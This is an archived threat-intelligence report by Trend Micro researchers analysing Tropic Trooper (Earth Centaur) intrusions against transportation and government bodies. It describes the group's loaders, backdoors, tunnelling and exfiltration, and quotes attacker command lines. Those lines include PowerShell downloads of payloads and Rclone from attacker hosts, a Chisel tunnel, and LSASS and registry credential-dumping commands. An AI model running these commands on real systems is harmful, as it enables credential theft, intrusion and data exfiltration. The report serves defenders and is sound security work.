{
    "id": "9230e1c4-7f98-4356-aba8-c59def0d7e63",
    "created_at": "2023-01-12T15:02:12.595589Z",
    "updated_at": "2025-03-27T02:16:04.386143Z",
    "deleted_at": null,
    "sha1_hash": "b567d54124a81007e52172c7045ea2bf69d010cb",
    "title": "2021-12-14 - Collecting In the Dark- Tropic Trooper Targets Transportation and Government",
    "authors": "",
    "file_creation_date": "2022-05-27T23:11:14Z",
    "file_modification_date": "2022-05-27T23:11:14Z",
    "file_size": 3461979,
    "plain_text": "# Tropic Trooper Targets Transportation and Government Organizations\n\n**trendmicro.com/en_us/research/21/l/collecting-in-the-dark-tropic-trooper-targets-transportation-and-government-**\norganizations.html\n\nDecember 14, 2021\n\nAPT & Targeted Attacks\n\n## Collecting In the Dark: Tropic Trooper Targets Transportation and Government\n\nOur long-term monitoring of the cyberespionage group Earth Centaur (aka Tropic Trooper)\nshows that the threat actors are equipped with new tools and techniques. The group seems\nto be targeting transportation companies and government agencies related to transportation.\n\nBy: Nick Dai, Ted Lee, Vickie Su December 14, 2021 Read time: ( words)\n\n[Earth Centaur, previously known as Tropic Trooper, is a long-running cyberespionage threat](https://www.trendmicro.com/en_us/research/20/e/tropic-troopers-back-usbferry-attack-targets-air-gapped-environments.html)\ngroup that has been active since 2011. In July 2020, we noticed interesting activity coming\nfrom the group, and we have been closely monitoring it since. The actors seem to be\ntargeting organizations in the transportation industry and government agencies related to\ntransport.\n\nWe observed that the group tried to access some internal documents (such as flight\nschedules and documents for financial plans) and personal information on the compromised\nhosts (such as search histories). Currently, we have not discovered substantial damage to\nthese victims as caused by the threat group. However, we believe that it will\ncontinue collecting internal information from the compromised victims and that it is\nsimply waiting for an opportunity to use this data.\n\nThrough long-term monitoring, we learned that this threat group is proficient at red teamwork.\nThe group knows how to bypass security settings and keep its\noperation unobstructive. Depending on the target, it uses backdoors with different\nprotocols, and it can also use the reverse proxy to bypass the monitoring of network security\nsystems. The usage of the open-source frameworks also allows the group to develop new\nbackdoor variants efficiently. We expand on these techniques and other capabilities in the\nfollowing sections.\n\nMore importantly, we believe the activities we observed are just the tip of the iceberg and\ntheir targets might be expanded to other industries that are related to transportation. It is our\naim, through this article, to encourage enterprises to review their own security setting\n\n\n-----\n\nand protect themselves from damage and compromise.\n\n## Overview of Earth Centaur’s infection chain\n\nBased on our investigation, we found that the intrusion process used by Earth Centaur can\nbe separated into several stages, which are shown in Figure 1.\n\nWe found that the threat actors used vulnerable Internet Information Services (IIS) server\nand Exchange server vulnerabilities as entry points, and then installed web shells. Afterward,\nthe .NET loader (detected as Nerapack) and the first stage backdoor (Quasar remote\nadministration tool aka Quasar RAT) were deployed on the compromised machine. Then,\ndepending on the victims, the threat actors dropped different types of second-stage\nbackdoors, such as ChiserClient and SmileSvr.\n\nAfter exploiting the victim's environments successfully, the threat actors start Active Directory\n(AD) discovery and spread their tools via Server Message Block (SMB). Then, they use\nintranet penetration tools to build the connection between the victim’s intranet and their\ncommand-and-control (C&C) servers. We go into further detail about these stages in our\nanalysis.\n\nFigure 1. Stages of Earth Centaur’s intrusion process\nTechnical Analysis of Earth Centaur’s Tools and Techniques\n\n**Stage 1: Loaders**\n\nAfter the threat actors get access to the vulnerable hosts by using ProxyLogon exploits and\nweb shells, they use bitsadmin to download the next-stage loader (loaders are detected as\nNerapack) as well as its payload file ( bin)\n\n\n-----\n\nC:\\Windows\\system32\\windowspowershell\\v1.0\\powershell.exe -Command &{ImportModule BitsTransfer; Start-BitsTransfer 'http://<redacted>:8000/dfmanager.exe'\n\"%temp%/dfmanager.exe\"}\"\n\nC:\\Windows\\system32\\windowspowershell\\v1.0\\powershell.exe -Command \"&{ImportModule BitsTransfer; Start-BitsTransfer 'http://<redacted>:8000/dfmanager.bin' \"C:\\Users\\\n<redacted>\\AppData\\Local\\Temp/dfmanager.bin\"}\"\n\nAfter our long-term monitoring, we observed that there are two different decryption\nalgorithms (DES or AES) used in Nerapack to decrypt the payload. Moreover, in its newer\nversion, it uses a technique called “Timestomping.” Timestomping is when the timestamp of\nthe payload file (.bin) is altered to make it harder for incident response analysts to find it.\n\nFigure 2. Timestomping used on the bin file\nThe decryption key is used as an argument of Nerapack and various keys are used on\ndifferent victims. It is a simple but effective technique that makes security analysis more\ndifficult and also ensures that only their operators can use the tools.\n\nThe command for execution is shown as here:\n\n  - Nerapack.exe {base64 encoded key}\n\nFortunately, we were still able to collect the decryption key in some cases and we decrypted\nthe payload successfully. Based on our current cases, the decrypted payload is Quasar RAT.\nAfter the payload is deployed, the actors can continue further malicious actions through\nQuasar RAT.\n\n**Stage 2: Backdoors**\n\nAfter further analysis, we found that the threat group developed multiple backdoors capable\nof communication via common network protocols. We think this indicates that it has the\ncapability to bypass network security systems by using these common protocols to transfer\ndata. We also found that the group tries to launch various backdoors per victim. Furthermore,\nit also tends to use existing frameworks to make customized backdoors. By using existing\nframeworks, examples of which are detailed in the following, it builds new backdoor variants\nmore efficiently.\n\n_ChiserClient_\n\n\n-----\n\nAfter the backdoor is launched, it will decrypt the embedded C&C configuration via AES\n(CTR mode) algorithm for the following connection. In the configuration, there are three C&C\naddresses and corresponding port numbers.\n\nFigure 3. Decrypted C&C configuration\nIn the first connection, ChiserClient will append the host name of the compromised host for\ncheck-in purposes. Then, it will keep running on the hosts and wait for further commands\nfrom the C&C server.\n\nChiserClient is installed as a system service to allow the threat actors access to higher\nprivileges and keep persistence on the compromised host. The capability of ChiserClient is\nshown in the following table:\n\nCommand code Function\n\n0x10001 Write specified file\n\n0x10002 Download File\n\n0x10003 Read specified file\n\n0x10004 No Action\n\n0x10005 Open a command shell for command execution\n\n_HTShell_\n\nHTShell is a simple backdoor that is developed using the Mongoose framework (version\n6.15). Mongoose is an Object Data Modeling (ODM) library for MongoDB and Node.Js. It is\nused to translate between objects in code and objects representation in MongoDB.\n\n\n-----\n\nWe saw in our cases that the HTShell client will be launched as a system service on the\ncompromised machine and that it will connect to a C&C server. HTShell supports importing\nadditional config files. We found that the additional config file is located in\n%PUBLIC%\\Documents\\sdcsvc.dat, and that the content should be encoded by base64. If\nno config file is imported, it will connect to the predefined C&C address.\n\nFigure 4. HTShell hardcoded C&Cs\nHTShell encodes a hard -coded string, \"tp===\" with custom base64 and embeds the encoded\nstring in the request cookies. If the C&C server receives the request with the special cookie\nvalue, it can verify that the request comes from its client applications.\n\nFigure 5. HTShell hardcoded and encoded cookie string in the request header\nThe response handler of HTShell will use “`” as delimiter to split the command code and\nargument for the received command. Hence, the command will be this format:\n\n<command code>`<custom-base64encoded-data>[`<more-custom-base64encodeddata>]\n\nHTShell currently supports three different backdoor functions, shown here:\n\n\n-----\n\nCommand code Function\n\n0 Open a command shell for command execution\n\n1 Upload file\n\n2 Download file\n\n_Customized Lilith RAT_\n\nDuring our investigation into Earth Centaurs activities, we found that it also uses another\nbackdoor called Lilith RAT. We think that this Lilith RAT is a highly modified version of the\n[open-source Lilith RAT. The actors reused part of the codes for command execution, while](https://github.com/werkamsus/Lilith)\nthe C&C protocol is changed to Dropbox HTTPS APIs.\n\nFigure 6. Reused codes from open-source Lilith RAT\nIn order to launch this RAT, the threat actors use a technique called \"Phantom DLL\nhijacking.\" In this technique, the RAT will be disguised as the normal wlbsctrl.dll. While the\nWindows service “IKEEXT” is starting, the fake wlbsctrl.dll is loaded and executed with high\nprivilege. Furthermore, when Lilith RAT is terminated, it will try to clean itself to prevent being\nfound by investigators.\n\nFigure 7. Self-deletion after execution\nFor the C&C connections, the customized Lilith RAT will first check in to the attacker’s\nDropbox and see if the victim host exists. If not, the hostname and IP address will be\ncollected and appended to the existing compromised hosts’ information. All data will then be\nencrypted and sent back.\n\n\n-----\n\nFigure 8. The first check-in request to the Dropbox C&C\nAfter the check-in request, the backdoor will start to wait for more commands to come in. All\nthe request data are formatted to JSON, and they are encrypted by AES and encoded by\nbase64.\n\nHere is a list of the C&C commands:\n\nCommand Description\n\nCMDCommand Executes commands\n\nDownloadCloudFile Downloads files\n\nUploadCloudFile Uploads files\n\nGetDir Lists directories\n\nGetDirFile Lists files in a directory\n\nDeleteSelf Deletes itself\n\n\n-----\n\n_SmileSvr_\n\nWe found that there are two types of SmileSvr. The difference between the two variants is\nthe protocol used for communication: ICMP and SSL. The threat actors will use an installer\nto install SmileSvr as a system service and drop a DAT file that contains encoded C&C\ninformation. In the configuration file, the memory size used for storing C&C address and\nC&C address will be defined.\n\nFigure 9. Encrypted configuration file\nThe ICMP version of SmileSvr will create an ICMP socket to connect to the specified C&C\naddress, which is defined in a configuration file. In each SmileSvr, there is an embedded\nnumber (e.g., 10601 in Figure 10.) and this value will be used as sequence number in the\nsent ICMP packet. We think attackers use this value to verify if the incoming packet belongs\nto their backdoor and filter out the noise.\n\nFigure 10. Decrypted configuration file\nWithout knowing the real traffic from the C&C server, we can only speculate on the content of\nthe response based on the receiving function. As shown in Figure 11, the content of the\nresponse should contain the sequence number used to verify if the received data comes\nfrom the correct source and two blocks of encrypted data.\n\nThe data decryption procedure is as follows:\n\n1. First, the encrypted data is decrypted with a one-byte XOR key (0xFF).\n2. The first of the decrypted content contains a magic number used to check data in the\n\nsecond block, a command code, and the XOR key to decrypt the second set of\nencrypted content.\n3. The second set of encrypted content is decrypted with an XOR key (0x99) from the\n\nprevious decrypted content, and within the decrypted data are instructions for the\nfollowing procedures.\n\n\n-----\n\nFigure 11. SmileSvr packet traffic format simulation\nWhile analyzing samples, we found that the C&C server was already inactive. Without\nknowing the traffic between SmileSvr and C&C server, we could not fully understand all\nfunctions. However, most of the backdoor functions are listed here:\n\nCommand code Function\n\n0x5001 Opens/Reads specified file\n\n0x5002 Unknown\n\n0x5004 Opens/Writes specified file\n\n0x5006 Opens command shell\n\n0x5007 Unknown\n\n0x5009 Closes command shell\n\n0x500A File System Traversal\n\n0x500C Checks environment information\n\n0x500E Unknown\n\nAs for the SSL version of SmileSvr, the capability of SSL communication is built by using\nwolfSSL, which is a lightweight, C-language based SSL/TLS library. The backdoor functions\nof SSL version SmileSvr are similar to the ICMP ones. The threat actors just use it to\ndevelop new ways to support data transfer via an encrypted channel.\n\n_Customized Gh0st RAT_\n\nIn our investigation, we also found a suspicious executable named telegram.exe. After\nanalyzing the file, we found that it was a customized version of Gh0st RAT. Compared to the\noriginal Gh0st RAT (Gh0st beta 3.6), the difference is that the customized version supports a\n\n\n-----\n\nnew function to discover information from active sessions on the host.\n\nAll supported functions for the customized Gh0st are shown in the following table:\n\nCommand code Function\n\n0xC8 Terminates connection\n\n0xCA File manager to handle file operations\n\n0xCB Screen monitoring\n\n0xCC Opens remote shell for command execution\n\n0XD5 Gets active session information\n\nPost-Exploitation\n\nAfter successfully exploiting the vulnerable system, the threat actor will use multiple hacking\ntools to discover and compromise machines on the victim’s intranet. In this stage, we also\nobserved attempts to deploy tools to exfiltrate stolen information.\n\nDuring our investigation, we found evidence of specific tools, which we listed in Table 1. With\nthese tools, the attackers accomplish their goals (network discovery, access to the intranet,\nand exfiltration) step by step.\n\nTool name Purpose Description\n\n\nSharpHound AD\nDiscovery\n\nFRPC Intranet\nPenetration\n\nChisel Intranet\nPenetration\n\n\nDiscovery tool to understand the relationship in an AD\nenvironment\n\nFast reverse proxy to help expose a local server behind a\nNAT or firewall to the internet\n\nFast TCP/UDP tunnel\n\n\nRClone Exfiltration A command-line program to sync files and directories to and\nfrom different cloud storage providers\n\n**Credential Dumping**\n\nWe also observed that the group used multiple legitimate tools to dump credentials on\ncompromised machines. It made good use of these tools to achieve its goal and keep its\noperation hidden and unobstructive.\n\nFor example, the group uses ProcDump.exe (a tool from Windows Sysinternals Suite that\ncreates dumps of the processes in any scenario), which it renamed bootsys.exe:\n\n\n-----\n\nc:\\users\\public\\downloads\\bootsys.exe -accepteula -ma lsass.exe\nC:\\Users\\Public\\Downloads\\lsass.dmp\n\nThe group dumps credentials stored in registries by using reg.exe:\n\nreg.exe save hklm\\sam C:\\Users\\Public\\Downloads\\sam.hive\n\nreg.exe save hklm\\sam c:\\windows\\temp\\sa.dit\n\nreg.exe save hklm\\security c:\\windows\\temp\\se.dit\n\nreg.exe save hklm\\system c:\\windows\\temp\\sy.dit\n\nThe group would also dump memory from the specified process by using comsvcs.dll:\n\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 764\nC:\\Windows\\TEMP\\dump.bin full\n\n**Indicator Removal**\n\nTo avoid exposing their footprints to investigators, the threat actors made their own tool to\nwipe out the event logs on the victimized machine. By using this tool, they could clean\nspecified event logs and make it hard for investigators to track their operations.\n\nThe usage is as follows:\n\n**Intranet Penetration**\n\nAfter successfully exploiting the vulnerable system, threat actors also drop following tools:\nFRP and Chisel. FRP is a fast reverse proxy used to expose a local server behind an NAT or\na firewall to the internet. It can read predefined configurations and make the host in the\nintranet available to users from the internet.\n\n\n-----\n\nFigure 12. Configuration for FRP fast\n\nreverse proxy\nChisel is a fast TCP/UDP tunnel, which is mainly used for passing through firewalls. It\nprovides the capability to transport data over HTTP (secured via Secure Shell, aka SSH) and\nallows threat actors to pass through a firewall and get access to the machine behind the\nfirewall.\n\nThis is used to download reverse proxy Chisel via PowerShell:\n\nc:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -command \"$(new-object\nSystem.Net.WebClient).DownloadFile('https[:]//webadmin[.]mirrorstorage[.]org/ch.exe',\n'ch.exe')\"\n\nThis is used to build a connection between inter/intranet via Chisel:\n\nC:\\WINDOWS\\system32\\ch.exe client https[:]//webadmin[.]mirrorstorage[.]org:443\nr:127.0.0.1:47586:socks\n\nExfiltration\n\nIn the previous phase, we observed that the actors use several tools to get the whole picture\nof the network infrastructure and bypass the firewall. Afterward, we observed a PowerShell\ncommand used to download an effective tool, Rclone, which is used for exfiltration. It also\nprovides an easy and effective way of copying data to several cloud storage providers.\n\nC:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -command \"$(newobject System.Net.WebClient).DownloadFile('http://195[.]123[.]221[.]7:8080/rclone.exe',\n'r.exe')\"\n\n\n-----\n\nBased on previous experience, Rclone has frequently been used in ransomware attacks to\nexfiltrate stolen data. However, it seems that currently, it is not only used in ransomware\nattacks but also in APT attacks.\n\nIdentifying Features in the Earth Centaur Campaign\n\nAfter long-term observation and analysis of the attack campaigns, there was compelling\nevidence that they were operated by Earth Centaur. We found several identifying features of\nthe threat actors within the techniques and tools described in the preceding sections, and we\nbreak down the factors in the following.\n\n**Mutex Style**\n\nWe found some special mutexes that are encoded by the layout of the Chinese Zhuyin\nkeyboard in ChiserClient. The decoded string is shown in Table 2. Based on these special\nmutex strings, we believe the threat actors come from a Chinese-speaking region.\n\nTable 2. Encoded/Decoded mutex string\n\n\nEncoded string Decoded string in\nChinese\n\n\nEnglish translation\n\n\nvul3ru,6q8 q8 y.3 小傑趴趴走 Jack goes around\n\nji394su3 我愛你 I love you\n\n\n5ji\nfu.6cl3g.3zj6m0694\n\n**Configuration style**\n\n\n桌球好手福原愛 Excellent table tennis player, Ai\nFukuhara\n\n\nAfter analyzing the ChiserClient, we found that it shares a similar style of network\n[configuration to the TClient mentioned in our previous research on Earth Centaur.](https://www.trendmicro.com/en_us/research/18/c/tropic-trooper-new-strategy.html)\n\n\n-----\n\nFigure 13. Network configuration (Left: ChiserClient Right: TClient)\n**Code Similarity**\n\nAfter checking the backdoor SmileSvr, we found that there was a code similarity between it\n[and Troj_YAHAMAM, which was used by Earth Centaur in an earlier operation. Both share](https://blog.trendmicro.com/operation-tropic-trooper-uses-legacy-vulnerabilities-to-steal-state-secrets/)\nsimilar codes in configuration decoding, which is shown in Figure 14. Furthermore, the\ndelimiter that was used in SmileSvr to split different values in configuration files is the same\nas the one used in YAHAMAM (shown as Figure 15).\n\n\n-----\n\nFigure 14. Configuration decoding function (left: SmileSvr right: Troj_Yahamam)\n\n\n-----\n\nFigure 15. Function used to split different values in configuration file (left: SmileSvr right:\nTroj_Yahamam)\nConclusion\n\nThese threat actors are notably sophisticated and well-equipped. Looking deeper into the\nnew methods the group uses, we found that it has an arsenal of tools capable of assessing\nand then compromising its targets while remaining under the radar. For example, the group\ncan map their target’s network infrastructure and bypass firewalls. It uses backdoors with\ndifferent protocols, which are deployed depending on the victim. It also has the capability to\ndevelop customized tools to evade security monitoring in different environments, and it\nexploits vulnerable websites and uses them as C&C servers.\n\nIn this blog, we outlined our new findings related to these threat actors to help possible\ntargets in the transportation and other industries. Information on how a threat enters and\noperates within a victim’s network is invaluable to security teams and can help them create\nmore effective protection for vulnerable organizations. Organizations can also find capable\nsecurity solutions that can help interpret and respond to malicious activities, techniques, and\nmovements before the threat can culminate and affect an enterprise. Trend Micro Vision\nOne™ with Managed XDR gives security teams a consolidated view into valuable insights so\nthey can organize a more solid line of defense ahead of attacks.\n\n[For a list of the Indicators of Compromise, please see this document.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/21/l/collecting-in-the-dark-tropic-trooper-targets-transportation-and-government-organizations/IOCs-Collecting-in-the-dark-Tropic-Trooper.txt)\n\nMITRE ATT&CK Matrix\n\n**Tactics** **ID** **Technique**\n\nInitial access T1190 Exploit public-facing application\n\n\n-----\n\nExecution T1059.001 Command and Scripting\nInterpreter: PowerShell\n\nT1059.003 Command and scripting interpreter:\nWindows Command Shell\n\nT1569.002 System Services: Service Execution\n\nPersistence T1543.003 Create or Modify System\nProcess: Windows Service\n\nT1574.002 Hijack Execution Flow: DLL SideLoading\n\nT1505.003 Server Software Component: Web\nShell\n\n\nDefense\nevasion\n\n\nT1140 Deobfuscate/Decode Files or\nInformation\n\n\nT1480 Execution Guardrails\n\nT1574.002 Hijack Execution Flow: DLL SideLoading\n\nT1070.001 Indicator Removal on Host: Clear\nWindows Event Logs\n\nT1027.002 Obfuscated Files or Information:\nSoftware Packing\n\nT1218.011 Signed Binary Proxy Execution:\nRundll32\n\nT1036.005 Masquerading: Match Legitimate\nName or Location\n\nT1197 BITS Jobs\n\nT1070.006 Indicator Removal on Host: Timestomp\n\n\nCredential\nAccess\n\n\nT1003.001 OS Credential Dumping: LSASS\nMemory\n\n\nT1552.002 OS Credential Dumping: Credentials in\nRegistry\n\n\nLateral\nMovement\n\n\nT1021.002 Remote Services:\nSMB/Windows Admin Shares\n\n\nDiscovery T1087.002 Account Discovery: Domain\nAccount\n\n\n-----\n\nT1482 Domain Trust Discovery\n\nT1083 File and Directory Discovery\n\nCollection T1005 Data from Local System\n\n\nCommand\nand control\n\n\nT1071.001 Application layer protocol: web\nprotocols\n\n\nT1095 Non-Application layer protocol\n\nT1090.001 Proxy: Internal Proxy\n\nExfiltration T1567.002 Exfiltration to Cloud Storage\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-14 - Collecting In the Dark- Tropic Trooper Targets Transportation and Government.pdf"
    ],
    "report_names": [
        "2021-12-14 - Collecting In the Dark- Tropic Trooper Targets Transportation and Government.pdf"
    ],
    "threat_actors": [
        {
            "id": "f74e4fe6-6281-45e7-8866-0ff4316381cc",
            "created_at": "2024-05-01T02:03:07.959101Z",
            "updated_at": "2025-03-27T02:05:17.270819Z",
            "deleted_at": null,
            "main_name": "BRONZE HOBART",
            "aliases": [
                "Pirate Panda ",
                "Tropic Trooper ",
                "KeyBoy "
            ],
            "source_name": "Secureworks:BRONZE HOBART",
            "tools": [
                " KeyBoy",
                " Pfine",
                "DSNGInstaller"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "61ea51ed-a419-4b05-9241-5ab0dbba25fc",
            "created_at": "2023-01-06T13:46:38.354607Z",
            "updated_at": "2025-03-27T02:00:02.81258Z",
            "deleted_at": null,
            "main_name": "APT23",
            "aliases": [
                "KeyBoy",
                "Tropic Trooper",
                "BRONZE HOBART",
                "G0081",
                "Red Orthrus",
                "Earth Centaur",
                "PIRATE PANDA"
            ],
            "source_name": "MISPGALAXY:APT23",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bef7800a-a08f-4e21-b65c-4279c851e572",
            "created_at": "2022-10-25T15:50:23.409336Z",
            "updated_at": "2025-03-27T02:00:55.463048Z",
            "deleted_at": null,
            "main_name": "Tropic Trooper",
            "aliases": [
                "Tropic Trooper",
                "Pirate Panda",
                "KeyBoy"
            ],
            "source_name": "MITRE:Tropic Trooper",
            "tools": [
                "USBferry",
                "ShadowPad",
                "PoisonIvy",
                "BITSAdmin",
                "YAHOYAH",
                "KeyBoy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "578f8e62-2bb4-4ce4-a8b7-6c868fa29724",
            "created_at": "2022-10-25T16:07:24.344358Z",
            "updated_at": "2025-03-27T02:02:10.182282Z",
            "deleted_at": null,
            "main_name": "Tropic Trooper",
            "aliases": [
                "APT 23",
                "Bronze Hobart",
                "Earth Centaur",
                "KeyBoy",
                "Operation Tropic Trooper",
                "Pirate Panda",
                "Tropic Trooper"
            ],
            "source_name": "ETDA:Tropic Trooper",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "ByPassGodzilla",
                "CHINACHOPPER",
                "CREDRIVER",
                "China Chopper",
                "Chymine",
                "Darkmoon",
                "Gen:Trojan.Heur.PT",
                "KeyBoy",
                "Neo-reGeorg",
                "PCShare",
                "POISONPLUG.SHADOW",
                "Poison Ivy",
                "RoyalRoad",
                "SPIVY",
                "ShadowPad Winnti",
                "SinoChopper",
                "Swor",
                "TSSL",
                "USBferry",
                "W32/Seeav",
                "Winsloader",
                "XShellGhost",
                "Yahoyah",
                "fscan",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535732,
    "ts_updated_at": 1743041764,
    "ts_creation_date": 1653693074,
    "ts_modification_date": 1653693074,
    "files": {
        "pdf": "https://archive.orkl.eu/b567d54124a81007e52172c7045ea2bf69d010cb.pdf",
        "text": "https://archive.orkl.eu/b567d54124a81007e52172c7045ea2bf69d010cb.txt",
        "img": "https://archive.orkl.eu/b567d54124a81007e52172c7045ea2bf69d010cb.jpg"
    }
}